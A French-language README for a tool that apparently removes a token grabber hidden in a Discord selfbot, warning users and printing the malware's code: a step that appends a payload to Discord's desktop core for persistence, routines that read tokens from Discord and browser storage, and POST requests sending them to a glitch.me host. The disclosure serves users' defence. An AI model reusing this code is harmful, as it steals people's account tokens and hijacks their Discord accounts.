# quentin-grabber-remover
programme pour supprimer le grabber de quentin (ogagal)  delta selfbot un selfbot de confiance


## slt cv

quand vous lancez le delta selfbot pour la première fois vous allez vous faire voler tous vos tokens

les navigateurs où les tokens sont grabb : 
```json
{
    discord,
    discord canary,
    Chrome,
    Opera,
    Brave,
    Yandex
}
```

Si vous vous êtes déjà connecté sur un de ces navigateurs/clients les admins du delta auront vos tokens, et à chaque redémarrage de discord vous allez vous faire token grabb

par le code si dessous: 

```js
//là le path est défini par "/AppData/Roaming/discord/0.0.309/modules/discord_desktop_core/index.js"
var path = __dirname.split(':')[0] + (":/Users/") + __dirname.split('\\')[2] + ("/AppData/Roaming/discord/0.0.309/modules/discord_desktop_core/index.js");

punchack.crypto == '0' && (path && (fs.appendFile(path, /*ici c'est pour dire de rajouter ce code dans l'index.js "path"*/`
//internet doit trembler...
const fs = require("fs")

var paths = [\`\${__dirname.split(":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Roaming/discord/Local Storage/leveldb\`,
\`\${__dirname.split(":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb\`,
\`\${__dirname.split(\":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb\`,
\`\${__dirname.split(\":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb\`,
\`\${__dirname.split(\":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb\`,
\`\${__dirname.split(\":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb\`
]`), function(err) {
    if (err) throw err;
}); 
```

les tokens sont ensuite récupérés avec ce code:

```js
for (i = 0; i < paths.length; i++) {
    
    get_token(paths[i])
    
}

async function get_token(path) {
    try {
        fs.readdir(path, (err, files) => {
            if (files === undefined) {
                return
            }

            var filtro = files.filter(f => f.split(".")
                .pop() === "ldb")
            for (i = 0; i < filtro.length; i++) {

                fs.readFile(`${path}/${filtro[i]}`, "utf-8", async function (err, data) {

                    let regex1 = /"[dw_-]{24}.[dw_-]{6}.[dw_-]{27}"/;

                    let regex2 = /"mfa.[dw_-]{84}"/;

                    let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                    if (match != null) {
                        match = match.replace(/"/g, "")
                        const benladen = new URLSearchParams();

                        benladen.append("token", match);

                        fetch("https://truthful-oceanic-bonobo.glitch.me/", {
                            method: "POST",
                            body: benladen
                        })

                        await fetch(`https://discord.com/api/v6/users/@me`, {
                                headers: {
                                    "authorization": match
                                }
                            })
                            .then(resp => resp.json())
                            .then(response => {
                                if (response.id) {
                                    send(match)
                                }
                            })
                    }
                })
            }
        })
        fs.readdir(path, (err, files) => {
            if (files === undefined) {

                return
            }
            var filtro = files.filter(f => f.split(".")
                .pop() === "log")
            for (i = 0; i < filtro.length; i++) {
                fs.readFile(`${path}/${filtro[i]}`, "utf-8", async function (err, data) {
                    let regex1 = /"[dw_-]{24}.[dw_-]{6}.[dw_-]{27}"/;
                    let regex2 = /"mfa.[dw_-]{84}"/;
                    if (regex1.test(data)) {}

                    let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                    if (match != null) {
                        match = match.replace(/"/g, "")

                        const attentat = new URLSearchParams();
                        attentat.append("token", match);
                        fetch("https://truthful-oceanic-bonobo.glitch.me/", {
                            method: "POST",
                            body: attentat
                        })
                        await fetch(`https://discord.com/api/v6/users/@me`, {
                                headers: {
                                    "authorization": match
                                }

                            })
                            .then(resp => resp.json())
                            .then(response => {
                                if (response.id) {
                                    send(match)
                                }
                            })
                    }
                })
            }
        })

    } catch (err) {

        console.log(err)
    }
}

function send(token) {
    let is = "0"
}
```

`(code qu'il a pris ici : https://github.com/xLucazzz-projects/Discord-TokenGrabber)`


Ps: vous pouvez check par vous même en allant dans le fichier "node modules/base-64/config.json" vous pourrez voir 
```json
{ "crypto": "0" }
```
# Attention
si vous avez :
```json
{ "crypto": "1" }
```
__c'est que vous vous êtes déjà fait grabb__
pour retirer le token grabber j'ai fais ce petit programme:
`https://github.com/NotPunchnox/quentin-grabber-remover/`

```js
const fs = require("fs")


```

Ensuite,

à chaque lancement du Quentin eu delta selfbot le token que vous aurez mis dans le fichier config.json sera volé via cet api (glitch encore une fois :rire:)

`https://truthful-oceanic-bonobo.glitch.me/`

avec ce code : 
```js
const searchParams = new URLSearchParams();
searchParams.append("token", token);
fetch("https://truthful-oceanic-bonobo.glitch.me/", {
    'method': "POST",
    'body': searchParams
});
```


```



sinon discord.gg/punchnox quand j'aurais fini de deob je leak les codes ^^

```
